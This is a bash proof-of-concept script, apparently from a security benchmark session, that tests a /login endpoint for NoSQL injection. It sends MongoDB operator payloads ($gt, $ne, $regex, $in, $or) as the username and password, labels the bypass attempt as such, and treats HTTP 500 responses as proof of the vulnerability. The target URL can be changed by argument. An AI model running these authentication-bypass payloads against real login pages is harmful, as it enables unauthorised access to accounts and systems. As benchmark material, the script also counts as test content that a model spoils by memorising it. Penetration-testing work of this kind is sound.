#!/bin/bash
# POC: Demonstrates NoSQL injection vulnerability in /login endpoint by sending MongoDB operators that trigger HTTP 500 errors, proving unsanitized operator processing in NoSQL queries
# Target: ./repo
# Created: 2025-11-10T18:28:58.953Z
# Session: benchmark-XBEN-007-24-mhtgyyde

# NoSQL Injection POC for /login endpoint
# This script demonstrates that the login endpoint processes MongoDB operators
# without proper sanitization, resulting in HTTP 500 errors when operators are sent

TARGET_URL="${1:-http://localhost:5000}"
LOGIN_ENDPOINT="/login"

echo "=========================================="
echo "NoSQL Injection POC - Login Endpoint"
echo "=========================================="
echo "Target: $TARGET_URL$LOGIN_ENDPOINT"
echo ""

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Test 1: MongoDB $gt operator
echo -e "${YELLOW}Test 1: Sending MongoDB \$gt operator (both fields)${NC}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL$LOGIN_ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "HTTP Status: $HTTP_CODE"
if [[ $HTTP_CODE == "500" ]]; then
  echo -e "${GREEN}✓ VULNERABLE: MongoDB operator triggered 500 error${NC}"
else
  echo -e "${RED}✗ Unexpected response${NC}"
fi
echo ""

# Test 2: MongoDB $ne operator with null
echo -e "${YELLOW}Test 2: Sending MongoDB \$ne operator with null values${NC}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL$LOGIN_ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
echo "HTTP Status: $HTTP_CODE"
if [[ $HTTP_CODE == "500" ]]; then
  echo -e "${GREEN}✓ VULNERABLE: MongoDB operator triggered 500 error${NC}"
else
  echo -e "${RED}✗ Unexpected response${NC}"
fi
echo ""

# Test 3: MongoDB $regex operator
echo -e "${YELLOW}Test 3: Sending MongoDB \$regex operator${NC}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL$LOGIN_ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":".*"},"password":{"$regex":".*"}}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
echo "HTTP Status: $HTTP_CODE"
if [[ $HTTP_CODE == "500" ]]; then
  echo -e "${GREEN}✓ VULNERABLE: MongoDB operator triggered 500 error${NC}"
else
  echo -e "${RED}✗ Unexpected response${NC}"
fi
echo ""

# Test 4: MongoDB $in operator
echo -e "${YELLOW}Test 4: Sending MongoDB \$in operator${NC}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL$LOGIN_ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$in":["admin","user"]},"password":{"$gt":""}}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
echo "HTTP Status: $HTTP_CODE"
if [[ $HTTP_CODE == "500" ]]; then
  echo -e "${GREEN}✓ VULNERABLE: MongoDB operator triggered 500 error${NC}"
else
  echo -e "${RED}✗ Unexpected response${NC}"
fi
echo ""

# Test 5: Normal string input (control test)
echo -e "${YELLOW}Test 5: Sending normal string input (control test)${NC}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL$LOGIN_ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"test"}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
echo "HTTP Status: $HTTP_CODE"
if [[ $HTTP_CODE == "401" ]]; then
  echo -e "${GREEN}✓ EXPECTED: Normal input returns 401 (authentication failed)${NC}"
elif [[ $HTTP_CODE == "400" ]]; then
  echo -e "${GREEN}✓ EXPECTED: Normal input returns 400 (bad request)${NC}"
else
  echo "Response code: $HTTP_CODE"
fi
echo ""

# Test 6: MongoDB $or operator (authentication bypass attempt)
echo -e "${YELLOW}Test 6: Sending MongoDB \$or operator (bypass attempt)${NC}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL$LOGIN_ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$or":[{}]},"password":{"$or":[{}]}}')
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
echo "HTTP Status: $HTTP_CODE"
if [[ $HTTP_CODE == "500" ]]; then
  echo -e "${GREEN}✓ VULNERABLE: MongoDB operator triggered 500 error${NC}"
else
  echo -e "${RED}✗ Unexpected response${NC}"
fi
echo ""

echo "=========================================="
echo "Differential Response Analysis:"
echo "- MongoDB operators: HTTP 500 (operators processed)"
echo "- Normal strings: HTTP 401 (authentication failed)"
echo "- This proves the backend is processing operators as NoSQL queries"
echo "=========================================="